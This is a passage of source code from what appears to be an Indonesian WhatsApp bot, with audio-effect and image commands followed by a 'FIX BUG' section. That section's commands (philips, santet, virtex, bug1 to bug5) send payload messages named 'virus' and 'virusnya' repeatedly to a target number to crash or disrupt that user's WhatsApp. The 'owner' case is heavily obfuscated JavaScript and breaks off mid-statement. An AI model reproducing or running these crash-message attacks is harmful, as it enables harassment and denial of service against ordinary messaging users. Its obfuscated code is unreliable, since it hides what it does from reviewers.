if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=1.6,asetrate=22100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'nightcore':{
if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "areverse'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'reverse':{
if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "areverse"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'robot':{
if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'slow':{
if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=0.7,asetrate=44100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'smooth':{
if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'tupai':{
if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=0.5,asetrate=65100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

// Random image
case 'loli':
case 'husbu':
case 'milf':
case 'cosplay': {
if (cekUser("id", sender) == null) return daftarDlu()
let eek = await fetchJson(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)
let random = eek[Math.floor(Math.random() * eek.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break

case 'wallpaper':{
if (cekUser("id", sender) == null) return daftarDlu()
let crpe = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Mountain.json`)
let random = crpe[Math.floor(Math.random() * crpe.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break

case 'couple':
case 'ppcouple': {
if (cekUser("id", sender) == null) return daftarDlu()
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
conn.sendMessage(from, { image: { url: random.male }, caption: `Foto Couple Male` }, { quoted: msg })
conn.sendMessage(from, { image: { url: random.female }, caption: `Fofo Couple Female` }, { quoted: msg })
}
break

// FIX BUG
case 'sendbug':
case 'philips':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim philips to @${num.split('@')[0]}`, [num])
}
break

case 'philips2':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'philips3':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'santet':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!isGroup) return reply(mess.OnlyGrup)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else if (isQuotedMsg) {
number = quotedMsg.sender
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else {
reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
}
}
break

case 'santet2':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!isGroup) return reply(mess.OnlyGrup)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else if (isQuotedMsg) {
number = quotedMsg.sender
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else {
reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
}
}
break

case 'santet3':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!isGroup) return reply(mess.OnlyGrup)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else if (isQuotedMsg) {
number = quotedMsg.sender
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else {
reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
}
}
break

case 'virtex':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'virtex2':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virtex3':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'bug1':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'bug2':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'bug3':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'bug4':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
await sleep(3000)
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'bug5':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
await sleep(3000)
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'owner': 
case 'creator': {
(function(_0x37f5f7,_0x54e345){const _0x2e6c26=_0x37f5f7();function _0x37a4da(_0x579dd3,_0x498a90,_0x35e4a3,_0x29aacb,_0xfb3281){return _0x2c6c(_0xfb3281- -0x2cb,_0x579dd3);}function _0x434e29(_0x109ff6,_0x24d3ff,_0x41cd3d,_0x29f7f1,_0x28aa50){return _0x2c6c(_0x109ff6- -0x229,_0x24d3ff);}function _0x235fac(_0x26ca7c,_0x5b0968,_0x1685c7,_0x15513b,_0x47feb8){return _0x2c6c(_0x1685c7- -0xc3,_0x15513b);}function _0x5c93bb(_0x34fdf0,_0x5ce709,_0x4466d3,_0x33dfd6,_0xfc107d){return _0x2c6c(_0x4466d3- -0xde,_0x5ce709);}function _0x4faea7(_0x1b4f21,_0x45ff41,_0x52b0b5,_0x45dfc7,_0x2d1e34){return _0x2c6c(_0x2d1e34- -0x9e,_0x1b4f21);}while(!![]){try{const _0x554e1a=-parseInt(_0x235fac(0xcb,0x1b6,0x143,0x18f,0xeb))/(0xe2*0x18+0x13f7+-0x2e*0xe5)+parseInt(_0x235fac(0x1c2,0x2aa,0x1fa,0x2ab,0x1fa))/(0x24*-0x95+-0x4bb*-0x1+0x103b)+parseInt(_0x235fac(0x17d,0x21d,0x1d4,0x23f,0x249))/(-0x165a+0x25c+-0x239*-0x9)+-parseInt(_0x235fac(0x299,0x153,0x1ff,0x2b7,0x249))/(-0x43c+-0x1783+0x135*0x17)*(parseInt(_0x5c93bb(0x14f,0xd8,0x157,0x12a,0x19f))/(0x2*-0xdc+-0x63b+0x7f8))+-parseInt(_0x4faea7(0x20a,0x25d,0x280,0x24b,0x209))/(-0x79*-0x44+0x57e+-0x259c)+-parseInt(_0x5c93bb(0x1a5,0x29b,0x259,0x1a5,0x284))/(0x21b9+0xb55*-0x1+-0x165d)*(-parseInt(_0x37a4da(0x63,-0x30,0x112,0xb5,0x65))/(-0x1d18+0x233*0x1+-0x71*-0x3d))+-parseInt(_0x37a4da(0x86,-0x83,0x3a,-0x9d,0x1c))/(-0x3cf*0x5+0x1*0x19cd+0x6b9*-0x1)*(-parseInt(_0x37a4da(-0x2f,0xe4,0x27,-0x79,0x2f))/(0x9f+0x171f+-0x17b4));if(_0x554e1a===_0x54e345)break;else _0x2e6c26['push'](_0x2e6c26['shift']());}catch(_0xea5305){_0x2e6c26['push'](_0x2e6c26['shift']());}}}(_0x3340,-0xccbf6+0x189ef+0x14bf6f*0x1));const _0x1d6232=(function(){function _0x2c411a(_0x4d3c4b,_0x41e367,_0xb0426f,_0x5024fb,_0x64e8e8){return _0x2c6c(_0xb0426f- -0x34c,_0x41e367);}const _0x1f632f={'FRjYc':function(_0xaee1e5,_0x48a1fb){return _0xaee1e5(_0x48a1fb);},'MBeKS':function(_0x4688fa,_0x4f1ce0){return _0x4688fa!==_0x4f1ce0;},'XTfuB':_0x2c411a(0x22,-0x36,-0x2a,0x12,0x8a),'ArjJE':function(_0x238a7d,_0x39f68c){return _0x238a7d!==_0x39f68c;},'zRRGq':_0x2c411a(-0xcc,-0x1c9,-0x118,-0x129,-0x1b3),'NdKIM':_0x3dac4d(-0x1ce,-0x16c,-0x20b,-0x200,-0x16d),'rdYvD':function(_0x2cc9bc,_0x4c95d4){return _0x2cc9bc(_0x4c95d4);},'HIIDI':function(_0x19aa19,_0x509eee){return _0x19aa19+_0x509eee;},'EmOkQ':function(_0x5a23a4,_0xef21d2){return _0x5a23a4+_0xef21d2;},'pmSbT':_0x11fd8a(0x10d,0x1bc,0x148,0x1b5,0x138)+_0x11fd8a(0x1f9,0x120,0xff,0x1fc,0x17e)+_0x11fd8a(0x1ac,0x156,0x23f,0x266,0x1b8)+_0x3dac4d(-0xd2,-0x187,-0x11e,-0x92,-0x139),'NUftU':_0x31f1fb(0x19e,0x222,0x2d4,0x1e5,0x20f)+_0x3f4cdd(-0x15d,-0x123,-0x1c9,-0x1ac,-0x111)+_0x3f4cdd(-0x1ef,-0x152,-0x1d6,-0x108,-0x13f)+_0x2c411a(-0xc0,-0x158,-0x153,-0x12b,-0x13c)+_0x3dac4d(-0x131,-0x18f,-0x8e,-0x156,-0xde)+_0x3dac4d(-0x179,-0x194,-0xcf,-0xc6,-0x198)+'\x20)','qbWxK':function(_0x34ec12){return _0x34ec12();},'RFZex':_0x11fd8a(0x1f3,0x1c2,0x126,0x1f2,0x1d1),'BOFaD':_0x2c411a(-0x155,-0xbb,-0xf9,-0x9c,-0xfa),'IHwgk':_0x31f1fb(0x200,0x1ca,0x192,0x1e2,0x188),'sqKTc':_0x11fd8a(0x290,0x20c,0x17d,0x222,0x218),'nUnCR':_0x11fd8a(0x155,0x10d,0x158,0x167,0x13c)+_0x31f1fb(0x121,0x103,0x55,0xc9,0xc1),'xCBGJ':_0x11fd8a(0x1ea,0xc6,0x18f,0x12e,0x17a),'yQvuS':_0x3dac4d(-0x14b,-0x16d,-0x19b,-0x138,-0x140),'asHRU':function(_0x1c6062,_0x29f5ce){return _0x1c6062<_0x29f5ce;},'OwcgW':function(_0x12db6c,_0x8d6bec){return _0x12db6c!==_0x8d6bec;},'IXbIc':_0x3dac4d(-0xd5,-0xfc,-0x10a,-0x64,-0x60)};function _0x11fd8a(_0x35f04c,_0x3134fd,_0x6b0fdc,_0x533585,_0x329b7b){return _0x2c6c(_0x329b7b- -0x123,_0x35f04c);}function _0x31f1fb(_0x15e1da,_0xbbff69,_0x3c40d6,_0x266365,_0x24a1d1){return _0x2c6c(_0xbbff69- -0x11e,_0x266365);}let _0x4f36f5=!![];function _0x3dac4d(_0x257521,_0x3f8764,_0x3f5185,_0x192a60,_0x11b1e9){return _0x2c6c(_0x257521- -0x3db,_0x3f8764);}function _0x3f4cdd(_0x541853,_0x2540e6,_0xd03ef3,_0x4a449b,_0x195ac4){return _0x2c6c(_0x195ac4- -0x368,_0x4a449b);}return function(_0x1b7958,_0x28b9c5){function _0x8938f1(_0x4ed183,_0x22791c,_0x185e01,_0x3e1995,_0x1a222e){return _0x2c411a(_0x4ed183-0xe6,_0x3e1995,_0x1a222e-0xf7,_0x3e1995-0x1bc,_0x1a222e-0x15b);}function _0x80c12b(_0x4d7007,_0x216dd8,_0x2933b3,_0x5591f9,_0x18c52b){return _0x3f4cdd(_0x4d7007-0x13e,_0x216dd8-0x10,_0x2933b3-0x1a9,_0x2933b3,_0x18c52b-0x7c);}function _0x224543(_0x3c439c,_0x543edd,_0x35a940,_0x3373b6,_0x3fa488){return _0x11fd8a(_0x3fa488,_0x543edd-0x1a5,_0x35a940-0x5c,_0x3373b6-0xe0,_0x3373b6-0x193);}const _0x4da160={'gKnHJ':function(_0x1233b6,_0x4d2ce6){function _0x2e2662(_0x452f34,_0x77001e,_0x544053,_0xe4b66d,_0x206bad){return _0x2c6c(_0x77001e-0x222,_0xe4b66d);}return _0x1f632f[_0x2e2662(0x49c,0x42a,0x460,0x425,0x4d6)](_0x1233b6,_0x4d2ce6);},'etRXb':function(_0x213ff2,_0x85f474){function _0x4a6ae2(_0x41faa5,_0x2f9094,_0x17fa3c,_0x607693,_0x469984){return _0x2c6c(_0x2f9094-0x3cd,_0x41faa5);}return _0x1f632f[_0x4a6ae2(0x5c8,0x5b7,0x57a,0x515,0x58f)](_0x213ff2,_0x85f474);},'LcXRu':function(_0x5702b6,_0x49b5e3){function _0x3fc5b7(_0x474ebc,_0x48c85e,_0x152320,_0x266582,_0x1ffa20){return _0x2c6c(_0x266582-0xf,_0x474ebc);}return _0x1f632f[_0x3fc5b7(0x364,0x25f,0x294,0x2c1,0x359)](_0x5702b6,_0x49b5e3);},'GKwEA':_0x1f632f[_0x224543(0x34d,0x385,0x300,0x39a,0x2e1)],'WntbC':_0x1f632f[_0x49e641(0x1f6,0x271,0x27c,0x30f,0x303)],'SpxQp':function(_0x2fdb75){function _0x705999(_0x217e6c,_0x33fc9,_0xcf6baa,_0x5a5319,_0x43fef0){return _0x49e641(_0x217e6c-0x13b,_0x43fef0-0x220,_0x5a5319,_0x5a5319-0x1b5,_0x43fef0-0xa6);}return _0x1f632f[_0x705999(0x574,0x60f,0x57c,0x4bf,0x56d)](_0x2fdb75);},'bzuvn':_0x1f632f[_0x49e641(0x1f4,0x27a,0x2d4,0x26d,0x2e6)],'FXtLx':_0x1f632f[_0x224543(0x255,0x22d,0x2b8,0x275,0x1de)],'LlPUB':_0x1f632f[_0x8938f1(0x43,-0x2e,0x15,0x4d,0x26)],'NkKJK':_0x1f632f[_0x21d8cc(0x582,0x5d9,0x566,0x61a,0x5b8)],'IlqUw':_0x1f632f[_0x224543(0x2d7,0x37b,0x3e6,0x374,0x42a)],'pKSie':_0x1f632f[_0x80c12b(-0x49,-0x96,-0x1ae,-0x9c,-0xf5)],'gOChY':_0x1f632f[_0x49e641(0x459,0x3c1,0x326,0x3d9,0x447)],'EcOWB':function(_0xb4963c,_0x115ce1){function _0x3716e7(_0x24cb5b,_0x478c54,_0x1c82fd,_0x1de226,_0x187456){return _0x8938f1(_0x24cb5b-0xcb,_0x478c54-0x2d,_0x1c82fd-0x186,_0x1de226,_0x24cb5b-0x394);}return _0x1f632f[_0x3716e7(0x492,0x494,0x42f,0x40e,0x4cd)](_0xb4963c,_0x115ce1);}};function _0x21d8cc(_0x477d64,_0x4311ef,_0x37e9b7,_0x3c0ccc,_0x3ca280){return _0x2c411a(_0x477d64-0x119,_0x3c0ccc,_0x3ca280-0x648,_0x3c0ccc-0x12d,_0x3ca280-0x125);}function _0x49e641(_0x5e1b37,_0x39e6ab,_0x3e6426,_0x30d93e,_0x2e9ef3){return _0x3dac4d(_0x39e6ab-0x460,_0x3e6426,_0x3e6426-0x20,_0x30d93e-0x1c3,_0x2e9ef3-0xa);}if(_0x1f632f[_0x80c12b(-0xd1,-0x10e,-0x3,-0xb9,-0xb3)](_0x1f632f[_0x49e641(0x275,0x32b,0x38d,0x331,0x357)],_0x1f632f[_0x49e641(0x2f6,0x32b,0x2ee,0x331,0x398)]))_0x1f632f[_0x21d8cc(0x634,0x64d,0x5ca,0x5c9,0x5d2)](_0x5c62e1,'0');else{const _0x4c979e=_0x4f36f5?function(){function _0x33b960(_0x281d6d,_0x10071f,_0x853d87,_0x34fd51,_0x47ee5e){return _0x224543(_0x281d6d-0x62,_0x10071f-0x71,_0x853d87-0x39,_0x281d6d- -0x418,_0x34fd51);}function _0x249d1b(_0x29ca92,_0x21fe83,_0x158fd2,_0x2fc5af,_0x5b2122){return _0x8938f1(_0x29ca92-0x4d,_0x21fe83-0x19a,_0x158fd2-0x93,_0x2fc5af,_0x5b2122-0x521);}function _0x299d20(_0xfb5799,_0x4bd1d3,_0x58d2a6,_0x552562,_0x38624f){return _0x21d8cc(_0xfb5799-0x44,_0x4bd1d3-0x18a,_0x58d2a6-0xb8,_0x58d2a6,_0xfb5799- -0x3f5);}function _0x5bba91(_0x543a57,_0x5029cc,_0x3ff20f,_0x1528ee,_0x2bbf41){return _0x80c12b(_0x543a57-0x52,_0x5029cc-0x15f,_0x3ff20f,_0x1528ee-0x98,_0x1528ee-0x437);}function _0x8b1167(_0x442e81,_0x3c1e44,_0x210baf,_0x266f50,_0x3a2525){return _0x224543(_0x442e81-0x32,_0x3c1e44-0x15b,_0x210baf-0x123,_0x266f50- -0x182,_0x442e81);}if(_0x1f632f[_0x8b1167(0xed,0x1a6,0xf3,0x170,0x170)](_0x1f632f[_0x8b1167(0x6d,0xe0,0x7f,0x120,0x1c4)],_0x1f632f[_0x8b1167(0x1c3,0x1bc,0x11d,0x120,0x12a)])){const _0x367881=_0x18a5e1[_0x249d1b(0x616,0x605,0x655,0x636,0x617)](_0x413371,arguments);return _0x517737=null,_0x367881;}else{if(_0x28b9c5){if(_0x1f632f[_0x33b960(-0x91,-0x118,-0x32,0x25,-0xb0)](_0x1f632f[_0x249d1b(0x6b4,0x677,0x62b,0x67e,0x605)],_0x1f632f[_0x249d1b(0x4bf,0x5e6,0x521,0x558,0x542)])){const _0x2846d1=_0x28b9c5[_0x249d1b(0x669,0x5d7,0x6b9,0x606,0x617)](_0x1b7958,arguments);return _0x28b9c5=null,_0x2846d1;}else{let _0x558266;try{const _0x22e115=_0x4da160[_0x33b960(-0x181,-0x16f,-0x21a,-0xeb,-0x1b1)](_0x31bb34,_0x4da160[_0x5bba91(0x3b2,0x3af,0x3ae,0x390,0x364)](_0x4da160[_0x299d20(0x1df,0x1fb,0x1a8,0x292,0x213)](_0x4da160[_0x299d20(0x21b,0x29d,0x1e7,0x198,0x197)],_0x4da160[_0x8b1167(0x19c,0x273,0x161,0x1c2,0x1c6)]),');'));_0x558266=_0x4da160[_0x5bba91(0x311,0x325,0x471,0x3bf,0x37f)](_0x22e115);}catch(_0xbbc77c){_0x558266=_0xe7eb48;}const _0x557134=_0x558266[_0x249d1b(0x595,0x613,0x5ea,0x61b,0x5c4)+'le']=_0x558266[_0x33b960(-0xb0,-0x158,-0x96,-0x17,-0x72)+'le']||{},_0x303889=[_0x4da160[_0x5bba91(0x2f3,0x373,0x3d0,0x37e,0x2d5)],_0x4da160[_0x299d20(0x218,0x16e,0x2aa,0x20c,0x2b2)],_0x4da160[_0x8b1167(0xfe,0x5d,0x11f,0x112,0xb3)],_0x4da160[_0x249d1b(0x4a1,0x4d0,0x43b,0x524,0x4bd)],_0x4da160[_0x299d20(0x167,0x121,0x13b,0x187,0x15c)],_0x4da160[_0x299d20(0x1f6,0x252,0x21c,0x1d1,0x1ea)],_0x4da160[_0x33b960(-0x85,0x13,-0x66,-0x107,-0x23)]];for(let _0x45ecd4=0x1*0x201b+-0x27*0x58+-0x1*0x12b3;_0x4da160[_0x299d20(0x221,0x1c6,0x258,0x272,0x243)](_0x45ecd4,_0x303889[_0x249d1b(0x6b2,0x5ad,0x5ec,0x65c,0x5fd)+'h']);_0x45ecd4++){const 